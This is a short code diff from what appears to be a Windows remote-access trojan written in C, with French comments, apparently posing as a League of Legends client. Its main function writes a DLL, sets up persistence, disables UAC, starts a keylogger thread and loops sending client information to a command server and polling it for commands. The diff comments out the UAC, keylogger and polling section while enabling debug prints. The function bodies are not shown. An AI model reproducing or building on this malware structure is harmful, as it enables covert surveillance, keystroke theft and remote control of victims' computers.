@@ -12,10 +12,10 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
     //Ajout de la persistance
     printf("%s\n", WritePa5aDll() ? "DLL -> OK" : "DLL -> ERROR");
     printf("%s\n", SetPersistence() ? "Persistence -> OK" : "Persistence -> ERROR");
-    printf("%s\n", DisableUac() ? "UAC -> OK" : "UAC -> ERROR");
+    /*printf("%s\n", DisableUac() ? "UAC -> OK" : "UAC -> ERROR");
 
     HANDLE hThreadKeylogger = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);
-
+    
     if (!StrStrW(lpCmdLine, L"/silent"))
         HANDLE hThreadLeagueOfLegends = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadLeagueOfLegends, NULL, 0, NULL);
     else
@@ -23,12 +23,12 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 
     while (TRUE)
     {
-        //printf("Sending client informations\n");
+        printf("Sending client informations\n");
         if (!SendClientInformations())
             continue;
 
         //Polling for new commands
-        //printf("Polling for new commands ...\n");
+        printf("Polling for new commands ...\n");
         Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);
 
         if (commands.keylogs)
@@ -51,7 +51,7 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
         }
 
         Sleep(1000);
-    }
+    }*/
 
     return 0;
 }
